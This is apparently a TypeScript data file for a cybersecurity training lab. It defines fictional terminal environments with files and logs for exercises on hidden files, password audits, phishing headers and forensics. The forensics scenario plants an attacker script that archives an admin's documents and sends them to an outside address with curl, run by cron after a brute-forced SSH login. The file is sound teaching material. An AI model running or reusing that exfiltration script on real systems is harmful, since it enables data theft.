/**
 * Simulated terminal environments. Each one is a small, fictional, read-only filesystem (plain objects in
 * memory) plus optional simulated network data. Nothing here touches the real machine: the terminal engine
 * only ever reads these objects. All addresses use private or documentation ranges (RFC 1918 / RFC 5737).
 */
export type FsNode = FsFile | FsDirectory
export interface FsFile {
  type: 'file'
  content: string
}
export interface FsDirectory {
  type: 'dir'
  children: Record<string, FsNode>
}

export interface NetworkInterface {
  name: string
  ipv4: string
  subnetMask: string
  gateway: string
  dns: string[]
  mac: string
}

export interface SimulatedHost {
  ip: string
  /** false -> every ping request times out. */
  reachable: boolean
  latencyMs: number
}

export interface TerminalEnvironment {
  id: string
  title: string
  user: string
  hostname: string
  home: string
  /** Commands available on top of the basic set (help, clear, history, pwd, whoami, echo, ls, cd, cat). */
  extraCommands: string[]
  root: FsDirectory
  network?: { interfaces: NetworkInterface[]; hosts: Record<string, SimulatedHost> }
}

const file = (content: string): FsFile => ({ type: 'file', content })
const dir = (children: Record<string, FsNode> = {}): FsDirectory => ({ type: 'dir', children })
const lines = (...text: string[]) => text.join('\n') + '\n'

const standardEtc = (hostname: string) =>
  dir({
    hostname: file(lines(hostname)),
    motd: file(lines('Welcome to the CyberLab practice machine.', 'Everything here is simulated: no real system is affected.')),
  })

export const environments: TerminalEnvironment[] = [
  {
    id: 'linux-onboarding',
    title: 'Lab workstation',
    user: 'student',
    hostname: 'lab-ws01',
    home: '/home/student',
    extraCommands: [],
    root: dir({
      etc: standardEtc('lab-ws01'),
      tmp: dir(),
      home: dir({
        student: dir({
          'README.txt': file(
            lines(
              'Welcome to your first day on the security team!',
              'Your onboarding note is saved somewhere inside the "documents" folder.',
              'Tip: use "ls" to see what is in a folder and "cd" to move into it.',
            ),
          ),
          documents: dir({
            onboarding: dir({
              'note.txt': file(
                lines(
                  'ONBOARDING NOTE',
                  '---------------',
                  'Hello and welcome! Your mentor this week is Priya.',
                  'Please keep this code private; you will need it to activate your lab account.',
                  '',
                  'Your lab access code is: TUX-4821',
                ),
              ),
            }),
            reports: dir({
              'q3-summary.txt': file(lines('Q3 security summary: 12 phishing reports, 0 confirmed breaches.')),
              'incident-template.txt': file(lines('Incident ID:', 'Date:', 'Systems affected:', 'Summary:')),
            }),
          }),
          downloads: dir(),
        }),
      }),
    }),
  },
  {
    id: 'linux-hidden',
    title: 'Web developer workstation',
    user: 'student',
    hostname: 'dev-ws07',
    home: '/home/student',
    extraCommands: [],
    root: dir({
      etc: standardEtc('dev-ws07'),
      tmp: dir(),
      home: dir({
        student: dir({
          '.bashrc': file(lines('# ~/.bashrc: shell settings', 'alias ll="ls -la"')),
          'TODO.txt': file(lines('- Ask the team lead to review the webapp folder before we publish it.')),
          webapp: dir({
            'index.html': file(lines('<!doctype html>', '<title>Team Portal</title>', '<h1>Team Portal</h1>')),
            'app.js': file(lines('// Reads database settings from environment variables at startup.', 'const password = process.env.DB_PASSWORD')),
            'README.md': file(lines('# Team Portal', 'Configuration is loaded from environment variables. Never commit secrets.')),
            '.gitignore': file(lines('node_modules/', '.env')),
            '.env.backup': file(
              lines(
                '# Backup of the production .env file - TEMPORARY, delete after migration',
                'DB_HOST=10.0.8.15',
                'DB_USER=portal_app',
                'DB_PASSWORD=Pa55-Lab-Only',
              ),
            ),
          }),
        }),
      }),
    }),
  },
  {
    id: 'network-office',
    title: 'Office workstation',
    user: 'student',
    hostname: 'office-pc12',
    home: '/home/student',
    extraCommands: ['ipconfig', 'ping'],
    root: dir({
      etc: standardEtc('office-pc12'),
      tmp: dir(),
      home: dir({
        student: dir({
          'servers.txt': file(
            lines(
              'Servers to check during the morning health check:',
              '  fileserver.lab   (shared drives)',
              '  mail.lab         (email)',
              '  backup.lab       (nightly backups)',
            ),
          ),
          'helpdesk-ticket.txt': file(
            lines('Ticket #4471: "Backups failed last night and I cannot reach one of the servers."', 'Please find out which server is not responding.'),
          ),
        }),
      }),
    }),
    network: {
      interfaces: [
        { name: 'eth0', ipv4: '192.168.10.42', subnetMask: '255.255.255.0', gateway: '192.168.10.1', dns: ['192.168.10.53'], mac: '52:54:00:3a:7c:19' },
      ],
      hosts: {
        'fileserver.lab': { ip: '10.0.5.10', reachable: true, latencyMs: 3 },
        'mail.lab': { ip: '10.0.5.20', reachable: true, latencyMs: 5 },
        'backup.lab': { ip: '10.0.5.30', reachable: false, latencyMs: 0 },
        gateway: { ip: '192.168.10.1', reachable: true, latencyMs: 1 },
      },
    },
  },
  {
    id: 'password-audit',
    title: 'Security audit workstation',
    user: 'auditor',
    hostname: 'audit-ws02',
    home: '/home/auditor',
    extraCommands: ['grep'],
    root: dir({
      etc: standardEtc('audit-ws02'),
      tmp: dir(),
      home: dir({
        auditor: dir({
          audit: dir({
            'policy.txt': file(
              lines(
                'ACCOUNT SECURITY POLICY (excerpt)',
                '1. Every account must change its password at least once every 12 months.',
                '2. Accounts with role=admin MUST have multi-factor authentication (mfa=yes).',
                '3. Shared accounts are not allowed.',
              ),
            ),
            'accounts.txt': file(
              lines(
                '# Account security export, generated 2026-11-01. No passwords are stored in this file.',
                'username   role    mfa   last_password_change',
                'asharma    staff   yes   2026-08-14',
                'bnair      admin   yes   2026-10-02',
                'cmehta     staff   no    2025-12-30',
                'dfernandes staff   yes   2026-05-19',
                'rkhan      admin   no    2024-03-11',
                'spatel     staff   yes   2026-09-21',
                'tjoseph    admin   yes   2026-07-05',
                'vrao       staff   no    2026-01-27',
              ),
            ),
          }),
        }),
      }),
    }),
  },
  {
    id: 'crypto-workbench',
    title: 'Application server',
    user: 'student',
    hostname: 'app-srv03',
    home: '/home/student',
    extraCommands: ['base64'],
    root: dir({
      etc: standardEtc('app-srv03'),
      tmp: dir(),
      home: dir({
        student: dir({
          app: dir({
            'config.ini': file(
              lines(
                '[database]',
                'host = 10.0.8.15',
                'user = inventory_app',
                '; The password is stored ENCRYPTED in db_password.txt for security.',
                'password_file = db_password.txt',
              ),
            ),
            'db_password.txt': file(lines('T3JjaGlkLTc3')),
          }),
        }),
      }),
    }),
  },
  {
    id: 'phishing-mailbox',
    title: 'Mail client export',
    user: 'student',
    hostname: 'mail-ws04',
    home: '/home/student',
    extraCommands: ['grep'],
    root: dir({
      etc: standardEtc('mail-ws04'),
      tmp: dir(),
      home: dir({
        student: dir({
          mail: dir({
            'invoice_alert.eml': file(
              lines(
                'Return-Path: <bounce@micros0ft-support.net>',
                'Received: from mail.micros0ft-support.net (203.0.113.80) by mx.example.edu',
                'Authentication-Results: mx.example.edu; spf=fail smtp.mailfrom=micros0ft-support.net; dmarc=fail header.from=microsoft.com',
                'From: "Microsoft 365 Billing" <no-reply@microsoft.com>',
                'Reply-To: billing@micros0ft-support.net',
                'To: student@example.edu',
                'Subject: Action required: your subscription payment failed',
                'Date: Thu, 12 Nov 2026 08:14:02 +0000',
                '',
                'Dear customer,',
                'We could not process your last payment. Reply to this email with your card details',
                'within 24 hours to avoid losing access to your files.',
                '',
                'Microsoft 365 Billing Team',
              ),
            ),
            'library_notice.eml': file(
              lines(
                'Return-Path: <library@example.edu>',
                'Received: from smtp.example.edu (192.0.2.25) by mx.example.edu',
                'Authentication-Results: mx.example.edu; spf=pass smtp.mailfrom=example.edu; dmarc=pass header.from=example.edu',
                'From: "University Library" <library@example.edu>',
                'To: student@example.edu',
                'Subject: Your book is due on Friday',
                'Date: Wed, 11 Nov 2026 15:02:44 +0000',
                '',
                'Hello, a reminder that "Network Security Essentials" is due on Friday.',
              ),
            ),
          }),
        }),
      }),
    }),
  },
  {
    id: 'forensics-server',
    title: 'Compromised web server (snapshot)',
    user: 'analyst',
    hostname: 'web01',
    home: '/home/analyst',
    extraCommands: ['grep', 'find'],
    root: dir({
      etc: standardEtc('web01'),
      home: dir({
        analyst: dir({
          'case-notes.txt': file(
            lines(
              'CASE 2026-117: web01 sent unusual outbound traffic overnight.',
              'Start with the authentication log in /var/log, then look for anything the attacker left behind.',
            ),
          ),
        }),
        admin: dir({
          'backup.sh': file(lines('#!/bin/bash', '# Nightly backup of the web root (approved by IT, ticket #3310)', 'tar czf /backups/www-$(date +%F).tgz /var/www')),
          documents: dir({
            'clients.csv': file(lines('client,contact', 'Northwind Traders,orders@northwind.example', 'Contoso Ltd,it@contoso.example')),
          }),
        }),
      }),
      opt: dir({
        app: dir({
          'start.sh': file(lines('#!/bin/bash', '# Starts the company website', 'cd /var/www && ./server --port 8080')),
        }),
      }),
      tmp: dir({
        '.cache': dir({
          'sync.sh': file(
            lines(
              '#!/bin/bash',
              '# "system sync" - do not delete',
              'tar czf /tmp/.cache/d.tgz /home/admin/documents',
              'curl -s -X POST --data-binary @/tmp/.cache/d.tgz http://198.51.100.23/upload',
              'rm -f /tmp/.cache/d.tgz',
            ),
          ),
        }),
      }),
      var: dir({
        www: dir({ 'index.html': file(lines('<h1>web01</h1>')) }),
        log: dir({
          'syslog': file(lines('Nov 12 01:00:01 web01 CRON[1987]: (admin) CMD (/home/admin/backup.sh)', 'Nov 12 03:10:00 web01 CRON[2390]: (admin) CMD (/tmp/.cache/sync.sh)')),
          'auth.log': file(
            lines(
              'Nov 12 01:58:12 web01 sshd[2101]: Accepted publickey for priya from 192.0.2.15 port 50122 ssh2',
              'Nov 12 02:14:01 web01 sshd[2211]: Failed password for root from 203.0.113.45 port 51522 ssh2',
              'Nov 12 02:14:03 web01 sshd[2213]: Failed password for root from 203.0.113.45 port 51530 ssh2',
              'Nov 12 02:14:06 web01 sshd[2215]: Failed password for invalid user test from 203.0.113.45 port 51544 ssh2',
              'Nov 12 02:14:09 web01 sshd[2218]: Failed password for admin from 203.0.113.45 port 51551 ssh2',
              'Nov 12 02:15:40 web01 sshd[2236]: Failed password for priya from 192.0.2.15 port 50190 ssh2',
              'Nov 12 02:16:12 web01 sshd[2241]: Failed password for admin from 203.0.113.45 port 51602 ssh2',
              'Nov 12 02:16:15 web01 sshd[2243]: Failed password for admin from 203.0.113.45 port 51610 ssh2',
              'Nov 12 02:16:19 web01 sshd[2246]: Failed password for admin from 203.0.113.45 port 51617 ssh2',
              'Nov 12 02:16:22 web01 sshd[2249]: Accepted password for admin from 203.0.113.45 port 51625 ssh2',
              'Nov 12 02:31:47 web01 sshd[2301]: Accepted password for priya from 192.0.2.15 port 50211 ssh2',
            ),
          ),
        }),
      }),
    }),
  },
]

/** Recursively freezes an object so no code path can modify the simulated environments at runtime. */
function deepFreeze<T>(value: T): T {
  if (value && typeof value === 'object' && !Object.isFrozen(value)) {
    Object.freeze(value)
    for (const child of Object.values(value)) deepFreeze(child)
  }
  return value
}
deepFreeze(environments)

export function findEnvironment(id: string): TerminalEnvironment | undefined {
  return environments.find((environment) => environment.id === id)
}
